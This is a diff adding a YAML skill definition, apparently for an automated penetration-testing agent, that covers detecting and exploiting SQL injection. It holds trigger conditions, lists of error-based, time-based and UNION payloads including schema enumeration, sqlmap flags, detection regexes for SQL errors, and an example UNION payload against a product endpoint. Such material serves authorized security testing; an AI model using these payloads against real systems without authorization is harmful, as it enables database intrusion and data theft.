@@ -1,0 +1,67 @@
+name: sql_injection
+description: Detect and exploit SQL injection vulnerabilities
+phase: exploit
+priority: 8
+
+conditions:
+  triggers:
+    - SAST menemukan query dengan concatenated user input
+    - Parameter refleksikan karakter kutip (', ") di response
+    - Error SQL muncul di response (mysql_fetch, ORA-, SQL syntax)
+    - Endpoint menerima parameter numerik atau string
+  not_recommended:
+    - Parameter sudah menggunakan prepared statement/bind variable
+    - Input tervalidasi strict (enum, regex whitelist)
+    - Hanya integer dengan type casting ketat
+
+payloads:
+  error_based:
+    - "' OR '1'='1"
+    - "' OR 1=1--"
+    - "\" OR \"1\"=\"1"
+    - "' UNION SELECT NULL--"
+    - "admin'--"
+  time_based:
+    - "' AND SLEEP(3)--"
+    - "' WAITFOR DELAY '00:00:03'--"
+    - "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--"
+  union:
+    - "' UNION SELECT 1,2,3--"
+    - "' UNION SELECT @@version,2,3--"
+    - "' UNION SELECT table_name,2,3 FROM information_schema.tables--"
+
+tools:
+  primary: sqlmap
+  manual: [curl, httpx, python]
+  sqlmap_flags:
+    - "--batch"
+    - "--random-agent"
+    - "--level=3"
+    - "--risk=2"
+    - "--time-sec=3"
+
+validation:
+  method: deterministic
+  rules:
+    - type: error_pattern
+      patterns:
+        - "SQL syntax.*MySQL"
+        - "Warning.*mysql_"
+        - "ORA-[0-9]{5}"
+        - "PostgreSQL.*ERROR"
+        - "Unclosed quotation mark"
+    - type: timing
+      threshold_seconds: 2
+      method: "compare_response_time(original, payload) > threshold"
+    - type: boolean
+      method: "compare_responses(cond_true, cond_false) -> berbeda signifikan"
+  reject_if:
+    - "Error muncul tanpa payload injection (false positive)"
+    - "Timing sama antara payload SLEEP dan normal"
+    - "Response identik untuk true/false condition"
+
+examples:
+  - target: "/product?id=1"
+    payload: "1 AND 1=2 UNION SELECT 1,2,3,@@version"
+    indicator: "2.3.4-MariaDB-log"
+    tool: "curl"
